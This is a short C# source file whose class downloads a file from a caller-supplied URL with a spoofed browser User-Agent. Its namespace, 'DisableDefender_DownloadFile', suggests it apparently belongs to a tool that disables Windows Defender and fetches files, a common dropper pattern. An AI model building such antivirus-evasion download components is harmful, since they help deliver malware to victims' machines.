using System;
using System.Net;

namespace DisableDefender_DownloadFile
{
    public class Download
    {
        public void DownloadFile(string sourceUrl, string targetFolder)
        {
            WebClient downloader = new WebClient();

            downloader.Headers.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 8.0)");

            downloader.DownloadProgressChanged +=
                new DownloadProgressChangedEventHandler(Downloader_DownloadProgressChanged);

            downloader.DownloadFileAsync(new Uri(sourceUrl), targetFolder);

            while (downloader.IsBusy) { }
        }

        private void Downloader_DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
        {
        }
    }
}